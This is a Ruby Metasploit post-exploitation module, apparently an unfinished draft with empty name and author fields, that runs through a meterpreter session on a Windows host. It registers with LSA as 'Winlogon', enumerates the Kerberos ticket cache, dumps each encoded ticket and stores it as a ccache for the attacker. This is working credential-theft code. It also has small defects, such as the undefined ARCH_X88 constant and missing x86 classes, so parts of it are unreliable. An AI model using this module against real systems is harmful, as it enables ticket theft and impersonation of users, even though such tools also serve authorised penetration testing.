##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/kerberos/model/kerberos_flags'
require 'rex/proto/kerberos/model/ticket_flags'

class MetasploitModule < Msf::Post
  include Msf::Post::Process

  # https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/ne-ntsecapi-security_logon_type
  SECURITY_LOGON_TYPE = {
    0 => 'UndefinedLogonType',
    2 => 'Interactive',
    3 => 'Network',
    4 => 'Batch',
    5 => 'Service',
    6 => 'Proxy',
    7 => 'Unlock',
    8 => 'NetworkCleartext',
    9 => 'NewCredentials',
    10 => 'RemoteInteractive',
    11 => 'CachedInteractive',
    12 => 'CachedRemoteInteractive',
    13 => 'CachedUnlock'
  }.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => '',
        'Description' => %q{
        },
        'License' => MSF_LICENSE,
        'Author' => [
        ],
        'Platform' => ['win'],
        'SessionTypes' => %w[meterpreter],
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_railgun_api
            ]
          }
        }
      )
    )
  end

  def run
    luid = get_token_statistics&.authentication_id
    if luid.nil?
      # should probably be fail_with
      print_error("Failed to obtain the current LUID.")
      return nil
    end
    print_status("Current LUID: #{luid}")

    logon_session_data_ptr, logon_session_data = lsa_get_logon_session_data(luid)

    sid = '???'
    if logon_session_data.psid != 0
      result = session.railgun.advapi32.ConvertSidToStringSidA(logon_session_data.psid.to_i, 4)
      if result
        sid = session.railgun.util.read_string(result['StringSid'])
        session.railgun.kernel32.LocalFree(result['StringSid'])
      end
    end

    print_status("  Username:              #{read_lsa_unicode_string(logon_session_data.user_name)}")
    print_status("  Domain:                #{read_lsa_unicode_string(logon_session_data.logon_domain)}")
    print_status("  LogonId:               #{logon_session_data.logon_id}")
    print_status("  Session:               #{logon_session_data.session}")
    print_status("  UserSID:               #{sid}")
    print_status("  AuthenticationPackage: #{read_lsa_unicode_string(logon_session_data.authentication_package)}")
    print_status("  LogonType:             #{SECURITY_LOGON_TYPE.fetch(logon_session_data.logon_type.to_i, '???')} (#{logon_session_data.logon_type.to_i})")
    print_status("  LogonTime:             #{RubySMB::Field::FileTime.new(logon_session_data.logon_time.to_i).to_datetime}")
    print_status("  LogonServer:           #{read_lsa_unicode_string(logon_session_data.logon_server)}")
    print_status("  LogonServerDNSDomain:  #{read_lsa_unicode_string(logon_session_data.dns_domain_name)}")
    print_status("  UserPrincipalName:     #{read_lsa_unicode_string(logon_session_data.upn)}")
    session.railgun.secur32.LsaFreeReturnBuffer(logon_session_data_ptr)

    handle = lsa_register_logon_process
    fail_with(Failure::Unknown, 'Failed to obtain a handle to LSA.') if handle.nil?
    print_status("LSA Handle: 0x#{handle.to_s(16).rjust(16, '0')}")

    auth_package = lsa_lookup_authentication_package(handle, 'Kerberos')
    print_status("Authentication package: #{auth_package}")

    query_tkt_cache_req = KERB_QUERY_TKT_CACHE_REQUEST.new(message_type: 14, logon_id: logon_session_data.logon_id)
    query_tkt_cache_res_ptr, query_tkt_cache_res = lsa_call_authentication_package(handle, auth_package, query_tkt_cache_req)
    tkt_cache = KERB_QUERY_TKT_CACHE_RESPONSE_x64.read(query_tkt_cache_res)
    tkt_cache.tickets.each_with_index do |ticket, index|
      server_name = read_lsa_unicode_string(ticket.server_name)
      server_name_wz =  session.railgun.util.str_to_uni_z(server_name)
      print_status("  Ticket[#{index}]")
      print_status("    ClientName:     #{read_lsa_unicode_string(ticket.client_name)}")
      print_status("    ServerName:     #{server_name}")
      print_status("    StartTime:      #{RubySMB::Field::FileTime.new(ticket.start_time.to_i).to_datetime}")
      print_status("    EndTime:        #{RubySMB::Field::FileTime.new(ticket.end_time.to_i).to_datetime}")
      print_status("    RenewTime:      #{RubySMB::Field::FileTime.new(ticket.renew_time.to_i).to_datetime}")
      print_status("    EncryptionType: #{Rex::Proto::Kerberos::Crypto::Encryption::IANA_NAMES.fetch(ticket.encryption_type.to_i, ticket.encryption_type.to_i)}")
      print_status("    TicketFlags:    #{Rex::Proto::Kerberos::Model::TicketFlags.new(ticket.ticket_flags.to_i).enabled_flag_names.map(&:to_s).join(', ')}")

      retrieve_tkt_req = KERB_RETRIEVE_TKT_REQUEST_x64.new(message_type: 8, logon_id: logon_session_data.logon_id, cache_options: 8)
      ptr = session.railgun.util.alloc_and_write_data(retrieve_tkt_req.to_binary_s + server_name_wz)
      next if ptr.nil?

      retrieve_tkt_req.target_name.len = server_name_wz.length - 2
      retrieve_tkt_req.target_name.maximum_len = server_name_wz.length
      retrieve_tkt_req.target_name.buffer = ptr + retrieve_tkt_req.num_bytes
      session.railgun.memwrite(ptr, retrieve_tkt_req)
      retrieve_tkt_res_ptr, retrieve_tkt_res = lsa_call_authentication_package(handle, auth_package, ptr, submit_buffer_length: retrieve_tkt_req.num_bytes + server_name_wz.length)
      session.railgun.util.free_data(ptr)
      unless retrieve_tkt_res_ptr.nil?
        retrieve_tkt_res = KERB_RETRIEVE_TKT_RESPONSE_x64.read(retrieve_tkt_res)
        if retrieve_tkt_res.ticket.encoded_ticket != 0
          kirbi_ticket = session.railgun.memread(retrieve_tkt_res.ticket.encoded_ticket, retrieve_tkt_res.ticket.encoded_ticket_size)
          ccache_ticket = kirbi_to_ccache(kirbi_ticket)
          Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(ccache_ticket, framework_module: self)
        end
        session.railgun.secur32.LsaFreeReturnBuffer(retrieve_tkt_res_ptr)
      end
    end
    session.railgun.secur32.LsaFreeReturnBuffer(query_tkt_cache_res_ptr)

    lsa_deregister_logon_process(handle)
    print_status('Done!')
  end

  def kirbi_to_ccache(input)
    krb_cred = Rex::Proto::Kerberos::Model::KrbCred.decode(input)
    Msf::Exploit::Remote::Kerberos::TicketConverter.kirbi_to_ccache(krb_cred)
  end

  def get_token_statistics(token: nil)
    if token.nil?
      result = session.railgun.advapi32.OpenThreadToken(-2, session.railgun.const('TOKEN_QUERY'), false, 4)
      unless result['return']
        error = ::WindowsError::Win32.find_by_retval(result['GetLastError']).first
        unless error == ::WindowsError::Win32::ERROR_NO_TOKEN
          print_error("Failed to open the current thread token. OpenThreadToken failed with: #{error.to_s}")
          return nil
        end

        result = session.railgun.advapi32.OpenProcessToken(-1, session.railgun.const('TOKEN_QUERY'), 4)
        unless result['return']
          error = ::WindowsError::Win32.find_by_retval(result['GetLastError']).first
          print_error("Failed to open the current process token. OpenProcessToken failed with: #{error.to_s}")
          return nil
        end
      end
      token = result['TokenHandle']
    end

    result = session.railgun.advapi32.GetTokenInformation(token, 10, TOKEN_STATISTICS.new.num_bytes, TOKEN_STATISTICS.new.num_bytes, 4)
    unless result['return']
      error = ::WindowsError::Win32.find_by_retval(result['GetLastError']).first
      print_error("Failed to obtain the token information. GetTokenInformation failed with: #{error.to_s}")
      return nil
    end
    TOKEN_STATISTICS.read(result['TokenInformation'])
  end

  def read_lsa_unicode_string(str)
    # the len field is in bytes, divide by two because #read_wstring takes chars
    session.railgun.util.read_wstring(str.buffer, str.len / 2)
  end

  class LARGE_INTEGER < BinData::Record
    endian :big_and_little

    uint32 :low_part
    int32  :high_part

    def to_i
      (high_part.to_i << 32) | low_part.to_i
    end
  end

  class UNICODE_STRING_x64 < BinData::Record
    endian :little
    default_parameter byte_align: 8

    uint16 :len
    uint16 :maximum_len
    uint64 :buffer, byte_align: 8
  end

  class LSA_LAST_INTER_LOGON_INFO < BinData::Record
    endian :little

    large_integer :last_successful_logon
    large_integer :last_failed_logon
    uint32        :failed_attempt_count_since_last_successful_logon
  end

  class LSA_STRING_x64 < BinData::Record
    endian :little

    uint16 :len
    uint16 :maximum_len
    uint64 :buffer, byte_align: 8
  end

  class LSA_UNICODE_STRING_x64 < BinData::Record
    endian :little
    default_parameter byte_align: 8

    uint16 :len
    uint16 :maximum_len
    uint64 :buffer, byte_align: 8
  end

  class LUID < BinData::Record
    endian :little

    uint32 :low_part
    int32  :high_part

    def to_s
      "#{high_part.to_i.to_s(16).rjust(8, '0')}:#{low_part.to_i.to_s(16).rjust(8, '0')}"
    end
  end

  class KERB_CRYPTO_KEY_x64 < BinData::Record
    endian :little

    int32  :key_type
    uint32 :len
    uint64 :val
  end

  class KERB_EXTERNAL_TICKET_x64 < BinData::Record
    endian :little

    uint64              :service_name
    uint64              :target_name
    uint64              :client_name
    unicode_string_x64  :domain_name
    unicode_string_x64  :target_domain_name
    unicode_string_x64  :alt_target_domain_name
    kerb_crypto_key_x64 :session_key
    uint32              :ticket_flags
    uint32              :flags
    large_integer       :key_expiration_time
    large_integer       :start_time
    large_integer       :end_time
    large_integer       :renew_until
    large_integer       :time_skew
    uint32              :encoded_ticket_size
    uint64              :encoded_ticket, byte_align: 8
  end

  # https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Security/Authentication/Identity/struct.KERB_TICKET_CACHE_INFO_EX.html
  class KERB_TICKET_CACHE_INFO_EX_x64 < BinData::Record
    endian :little

    lsa_unicode_string_x64 :client_name
    lsa_unicode_string_x64 :client_realm
    lsa_unicode_string_x64 :server_name
    lsa_unicode_string_x64 :server_realm
    large_integer          :start_time
    large_integer          :end_time
    large_integer          :renew_time
    int32                  :encryption_type
    uint32                 :ticket_flags
  end

  class KERB_QUERY_TKT_CACHE_REQUEST < BinData::Record
    endian :little

    uint32 :message_type
    luid   :logon_id
  end

  class KERB_QUERY_TKT_CACHE_RESPONSE_x64 < BinData::Record
    endian :little

    uint32 :message_type
    uint32 :count_of_tickets
    array  :tickets, type: :kerb_ticket_cache_info_ex_x64, initial_length: :count_of_tickets
  end

  class KERB_RETRIEVE_TKT_REQUEST_x64 < BinData::Record
    endian :little

    uint32                 :message_type
    luid                   :logon_id
    lsa_unicode_string_x64 :target_name, byte_align: 8
    uint32                 :ticket_flags
    uint32                 :cache_options
    int32                  :encryption_type
    struct                 :credentials_handle, byte_align: 8 do # SecHandle, see: https://learn.microsoft.com/en-us/windows/win32/api/sspi/ns-sspi-sechandle
      uint64               :dw_lower
      uint64               :dw_upper
    end
  end

  class KERB_RETRIEVE_TKT_RESPONSE_x64 < BinData::Record
    endian :little

    kerb_external_ticket_x64 :ticket
  end

  class SECURITY_LOGON_SESSION_DATA_x64 < BinData::Record
    endian :little

    uint32                    :len
    luid                      :logon_id
    lsa_unicode_string_x64    :user_name, byte_align: 8
    lsa_unicode_string_x64    :logon_domain
    lsa_unicode_string_x64    :authentication_package
    uint32                    :logon_type
    uint32                    :session
    uint64                    :psid
    large_integer             :logon_time
    lsa_unicode_string_x64    :logon_server, byte_align: 8
    lsa_unicode_string_x64    :dns_domain_name
    lsa_unicode_string_x64    :upn
    uint32                    :user_flags
    lsa_last_inter_logon_info :last_logon_info, byte_align: 8
    lsa_unicode_string_x64    :logon_script, byte_align: 8
    lsa_unicode_string_x64    :profile_path
    lsa_unicode_string_x64    :home_directory
    lsa_unicode_string_x64    :home_directory_drive
    large_integer             :logoff_time
    large_integer             :kick_off_time
    large_integer             :password_last_set
    large_integer             :password_can_change
    large_integer             :password_must_change
  end

  class TOKEN_STATISTICS < BinData::Record
    endian :little

    luid          :token_id
    luid          :authentication_id
    large_integer :expiration_time
    int32         :token_type
    int32         :impersonation_level
    uint32        :dynamic_charged
    uint32        :dynamic_available
    uint32        :group_count
    uint32        :privilege_count
    luid          :modified_id
  end

  def lsa_string(string)
    if session.native_arch == ARCH_X64
      klass = LSA_STRING_x64
    elsif session.native_arch == ARCH_X88
      klass = LSA_STRING_x86
    else
      raise RuntimeError, 'Architecture must be x86 or x64'
    end

    ptr = session.railgun.util.alloc_and_write_string(string)
    return nil if ptr.nil?

    klass.new(len: string.length, maximum_len: string.length + 1, buffer: ptr)
  end

  def lsa_unicode_string(string)
    if session.native_arch == ARCH_X64
      klass = LSA_UNICODE_STRING_x64
    elsif session.native_arch == ARCH_X88
      klass = LSA_UNICODE_STRING_x86
    else
      raise RuntimeError, 'Architecture must be x86 or x64'
    end

    ptr = session.railgun.util.alloc_and_write_string(string)
    return nil if ptr.nil?

    klass.new(len: string.length, maximum_len: string.length + 2, buffer: ptr)
  end

  def lsa_call_authentication_package(handle, auth_package, submit_buffer, submit_buffer_length: nil)
    # todo: if auth_package is a string, resolve it to a number automatically
    # todo: cleanup the return value here to make it consistent
    submit_buffer = submit_buffer.to_binary_s if submit_buffer.is_a?(BinData::Struct)
    if submit_buffer_length.nil?
      submit_buffer_length = submit_buffer.length
    end

    result = session.railgun.secur32.LsaCallAuthenticationPackage(
      handle,
      auth_package,
      submit_buffer,
      submit_buffer_length,
      4,
      4,
      4
    )
    unless result['return'] == ::WindowsError::NTStatus::STATUS_SUCCESS
      status = ::WindowsError::NTStatus.find_by_retval(result['return']).first
      print_error("Failed to call the authentication package. LsaCallAuthenticationPackage failed with: #{status.to_s}")
      return nil
    end
    unless result['ProtocolStatus'] == ::WindowsError::NTStatus::STATUS_SUCCESS
      status = ::WindowsError::NTStatus.find_by_retval(result['ProtocolStatus']).first
      print_error("Failed to call the authentication package. LsaCallAuthenticationPackage authentication package failed with: #{status.to_s}")
      return nil
    end
    return [nil, nil] if result['ProtocolReturnBuffer'] == 0

    [result['ProtocolReturnBuffer'], session.railgun.memread(result['ProtocolReturnBuffer'], result['ReturnBufferLength'])]
  end

  def lsa_deregister_logon_process(handle)
    result = session.railgun.secur32.LsaDeregisterLogonProcess(handle)
    unless result['return'] == ::WindowsError::NTStatus::STATUS_SUCCESS
      status = ::WindowsError::NTStatus.find_by_retval(result['return']).first
      print_error("Failed to close the handle to LSA. LsaDeregisterLogonProcess failed with: #{status.to_s}")
      return nil
    end

    true
  end

  def lsa_get_logon_session_data(luid)
    logon_session_data = SECURITY_LOGON_SESSION_DATA_x64.new
    result = session.railgun.secur32.LsaGetLogonSessionData(luid, 8)
    unless result['return'] == ::WindowsError::NTStatus::STATUS_SUCCESS
      status = ::WindowsError::NTStatus.find_by_retval(result['return']).first
      print_error("Failed to obtain logon session data. LsaGetLogonSessionData failed with: #{status.to_s}")
      return nil
    end
    logon_session_data.read(session.railgun.memread(result['ppLogonSessionData'], logon_session_data.num_bytes))

    [result['ppLogonSessionData'], logon_session_data]
  end

  def lsa_lookup_authentication_package(handle, package_name)
    package_name = lsa_string(package_name)
    return nil if package_name.nil?

    result = session.railgun.secur32.LsaLookupAuthenticationPackage(handle, package_name, 4)
    session.railgun.util.free_string(package_name.buffer)
    unless result['return'] == ::WindowsError::NTStatus::STATUS_SUCCESS
      status = ::WindowsError::NTStatus.find_by_retval(result['return']).first
      print_error("Failed to lookup the authentication package. LsaLookupAuthenticationPackage failed with: #{status.to_s}")
      return nil
    end

    result['AuthenticationPackage']
  end

  def lsa_register_logon_process
    logon_process_name = lsa_string('Winlogon')
    return nil if logon_process_name.nil?

    result = session.railgun.secur32.LsaRegisterLogonProcess(logon_process_name.to_binary_s, 8, 4)
    session.railgun.util.free_string(logon_process_name.buffer)
    unless result['return'] == ::WindowsError::NTStatus::STATUS_SUCCESS
      status = ::WindowsError::NTStatus.find_by_retval(result['return']).first
      print_error("Failed to obtain a handle to LSA. LsaRegisterLogonProcess failed with: #{status.to_s}")
      return nil
    end

    result['LsaHandle']
  end
end
